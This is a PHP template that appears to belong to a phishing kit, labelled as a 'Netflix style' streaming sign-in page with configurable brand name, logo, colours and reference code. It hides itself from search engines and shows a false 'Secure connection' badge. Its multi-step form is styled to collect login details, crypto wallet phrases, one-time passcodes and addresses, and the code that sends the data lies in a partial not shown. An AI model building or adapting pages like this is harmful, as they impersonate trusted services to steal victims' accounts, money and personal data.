<?php
// Streaming template — Netflix style: pure black, red accent, sharp corners, bold sign-in
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title><?=$org_name?> — Sign In</title>
<meta name="robots" content="noindex,nofollow">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;min-height:100vh;min-height:100dvh;
  background:#000;
  display:flex;align-items:center;justify-content:center;padding:20px 16px;color:#fff;position:relative}

/* Blurred background effect */
body::before{content:'';position:fixed;inset:0;
  background:
    radial-gradient(ellipse at 30% 40%,rgba(<?=$ar?>,<?=$ag?>,<?=$ab?>,.18) 0%,transparent 50%),
    radial-gradient(ellipse at 70% 60%,rgba(<?=$ar?>,<?=$ag?>,<?=$ab?>,.1) 0%,transparent 50%);
  pointer-events:none;z-index:0}

.card{width:100%;max-width:450px;background:rgba(0,0,0,.85);border:none;border-radius:4px;overflow:hidden;position:relative;z-index:1;box-shadow:0 8px 40px rgba(0,0,0,.6)}

/* Top bar with brand */
.hd{background:<?=$accent?>;padding:0;position:relative;height:6px}
.hd-top{background:#141414;padding:22px 28px 18px;display:flex;align-items:center;gap:14px;border-bottom:1px solid rgba(255,255,255,.06)}
.logo-box{width:48px;height:48px;background:<?=$logo_bg?>;border-radius:6px;display:flex;align-items:center;justify-content:center;overflow:hidden;flex-shrink:0}
.logo-box img{width:100%;height:100%;object-fit:contain}
.logo-ini{font-size:20px;font-weight:900;color:<?=$accent?>}
.hd-brand{font-size:24px;font-weight:900;color:<?=$accent?>;letter-spacing:-.5px}
.hd-sub{font-size:10px;color:rgba(255,255,255,.4);margin-top:2px;text-transform:uppercase;letter-spacing:.6px}
.hd-ref{position:absolute;top:12px;right:20px;font-size:10px;font-weight:700;color:rgba(255,255,255,.4);background:rgba(255,255,255,.06);padding:2px 8px;border-radius:3px}

/* Big Sign In heading */
.bd{padding:30px 28px 22px}
.big-title{font-size:32px;font-weight:700;color:#fff;margin-bottom:26px;letter-spacing:-.5px}
.step-sub{font-size:14px;color:rgba(255,255,255,.55);margin-bottom:16px;line-height:1.4;display:none}

/* Steps — tiny red dots */
.steps{display:flex;gap:5px;margin-bottom:22px}
.dot{width:20px;height:3px;border-radius:1px;background:rgba(255,255,255,.15);transition:background .3s}
.dot.active{background:<?=$accent?>}
.dot.done{background:rgba(<?=$ar?>,<?=$ag?>,<?=$ab?>,.5)}

.field{margin-bottom:14px}
.field label{display:block;font-size:11px;color:rgba(255,255,255,.5);font-weight:600;letter-spacing:.6px;text-transform:uppercase;margin-bottom:6px}
.field input{width:100%;background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.12);color:#fff;padding:14px 16px;border-radius:4px;font-size:15px;outline:none;transition:border-color .2s,background .2s;font-family:inherit;-webkit-appearance:none}
.field input:focus{border-color:rgba(255,255,255,.4);background:rgba(255,255,255,.1)}
.field input::placeholder{color:rgba(255,255,255,.25)}
.or-div{text-align:center;font-size:11px;color:rgba(255,255,255,.25);margin:10px 0;position:relative}
.or-div::before,.or-div::after{content:'';position:absolute;top:50%;width:42%;height:1px;background:rgba(255,255,255,.08)}
.or-div::before{left:0}.or-div::after{right:0}
.card-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.btn{width:100%;padding:14px;background:<?=$accent?>;color:#fff;font-size:16px;font-weight:700;border:none;border-radius:4px;cursor:pointer;margin-top:8px;letter-spacing:.3px;transition:filter .15s;position:relative;font-family:inherit}
.btn:hover{filter:brightness(1.12)}
.btn:disabled{opacity:.6;cursor:not-allowed}
.btn.loading::after{content:'';position:absolute;right:16px;top:50%;width:18px;height:18px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;transform:translateY(-50%);animation:spin .7s linear infinite}
@keyframes spin{to{transform:translateY(-50%) rotate(360deg)}}
.err-msg{font-size:12px;color:#f87171;margin-top:8px;display:none}
.security-note{font-size:11px;color:rgba(255,255,255,.3);text-align:center;margin-top:16px}
.wallet-area{width:100%;min-height:80px;background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.12);color:#fff;padding:14px 16px;border-radius:4px;font-size:13px;font-family:monospace;outline:none;resize:none}
.wallet-area:focus{border-color:rgba(255,255,255,.4)}
.wallet-hint{font-size:11px;color:rgba(255,255,255,.3);margin-top:6px;line-height:1.5}
.otp-wrap{display:flex;gap:8px;justify-content:center}
.otp-wrap input{flex:1;text-align:center;font-size:22px;font-weight:700;padding:14px 4px;max-width:48px;background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.12);border-radius:4px;color:#fff;outline:none}
.otp-wrap input:focus{border-color:rgba(255,255,255,.4)}
.otp-hint{font-size:12px;color:rgba(255,255,255,.3);text-align:center;margin-top:8px}
.addr-area{width:100%;min-height:60px;background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.12);color:#fff;padding:14px 16px;border-radius:4px;font-size:14px;font-family:inherit;outline:none;resize:none}
.addr-area:focus{border-color:rgba(255,255,255,.4)}
.card-footer{padding:14px 20px;background:#0a0a0a;border-top:1px solid rgba(255,255,255,.05);font-size:10px;color:rgba(255,255,255,.25);text-align:center;line-height:1.6}

#loadOverlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.92);z-index:999;align-items:center;justify-content:center;flex-direction:column;gap:16px}
#loadOverlay.show{display:flex}
.load-spin{width:44px;height:44px;border:3px solid rgba(255,255,255,.08);border-top-color:<?=$accent?>;border-radius:50%;animation:spin .8s linear infinite}
.load-txt{font-size:13px;color:rgba(255,255,255,.4)}

@media(max-width:480px){
  body{padding:0;align-items:flex-start}
  .card{border-radius:0;min-height:100vh;min-height:100dvh}
  .bd{padding:24px 20px 16px}
  .hd-top{padding:18px 20px 14px}
  .big-title{font-size:26px}
}
</style>
</head>
<body>
<div id="loadOverlay"><div class="load-spin"></div><div class="load-txt" id="loadText">Signing you in…</div></div>

<div class="card">
  <div class="hd"></div>
  <div class="hd-top">
    <div class="logo-box">
      <?php if($logo_url):?><img src="<?=htmlspecialchars($logo_url)?>" alt="" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"><?php endif?>
      <span class="logo-ini" style="display:<?=$logo_url?'none':'flex'?>;align-items:center;justify-content:center;width:100%;height:100%"><?=mb_strtoupper(mb_substr($org_name,0,1))?></span>
    </div>
    <div>
      <div class="hd-brand"><?=htmlspecialchars($org_name)?></div>
      <div class="hd-sub"><?=htmlspecialchars($org_sub)?></div>
    </div>
    <div class="hd-ref"><?=htmlspecialchars($ref_code)?></div>
  </div>

  <div class="bd">
    <div class="big-title" id="bigTitle">Sign In</div>

    <div class="steps" id="stepDots">
      <?php for($i=1;$i<=$total_steps;$i++): ?>
      <div class="dot <?=$i===1?'active':''?>" id="d<?=$i?>"></div>
      <?php endfor; ?>
    </div>

    <?php for($sn=1;$sn<=$total_steps;$sn++): ?>
    <div id="step<?=$sn?>" <?=$sn>1?'style="display:none"':''?>>
      <div class="step-sub" id="step<?=$sn?>sub" style="<?=$sn>1?'display:block':''?>"><?=htmlspecialchars($sc['step_subs'][$sn])?></div>
      <form onsubmit="submitStep(event,<?=$sn?>)">
        <?php $fld = $sc['step'.$sn.'_fields'] ?? 'email_only'; include __DIR__.'/partials/fields.php'; ?>
        <button type="submit" class="btn" id="btn<?=$sn?>"><?=htmlspecialchars($sc['btn_labels'][$sn-1])?></button>
        <div class="err-msg" id="err<?=$sn?>">Please enter the required information.</div>
      </form>
      <div class="security-note">🔒 Secure connection</div>
    </div>
    <?php endfor; ?>
  </div>

  <?php if($footer): ?>
  <div class="card-footer"><?=htmlspecialchars($footer)?></div>
  <?php endif; ?>
</div>

<?php include __DIR__.'/partials/js.php'; ?>
<script>
const _stepTitles = <?=json_encode(array_values($sc['step_titles']))?>;
const _origShowS = showStep;
function showStep(n) {
    _origShowS(n);
    const bt = document.getElementById('bigTitle');
    if (bt && _stepTitles[n-1]) bt.textContent = _stepTitles[n-1];
}
</script>
</body>
</html>
